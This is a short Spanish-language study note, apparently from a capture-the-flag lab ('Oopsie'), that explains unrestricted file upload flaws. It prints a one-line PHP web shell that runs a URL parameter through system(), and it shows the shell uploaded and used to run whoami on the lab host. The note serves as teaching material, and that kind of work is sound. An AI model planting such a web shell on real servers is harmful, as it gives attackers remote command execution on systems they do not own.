Es una vulnerabilidad que permite a un atacante **subir archivos maliciosos** a un servidor sin restricciones adecuadas.  Puede usarse para ejecutar comandos, obtener shells o comprometer completamente el sistema.  
Sucede cuando la aplicación no valida correctamente el **tipo, nombre o contenido** del archivo subido.


# Ejemplo

Desde la parte de uploads, vamos a cargar un [[archivo php inyección comandos]]
![[Oopsie12.png]]


`test.php`
```
<?php system($_GET["cmd"]); ?>
```

Lo subimos con este contenido, en uno de nuestros primeros intentos de enumerar, habiamos visto que existe el directorio uploads
![[Oopsie11.png]]

Entonces desde el directorio uploads vamos a intentar inyectar comandos con la utilidad que subimos
http://10.129.207.226/uploads/test.php?cmd=whoami
![[Oopsie13.png]]
Nos responde www-data asi que funciona correctamente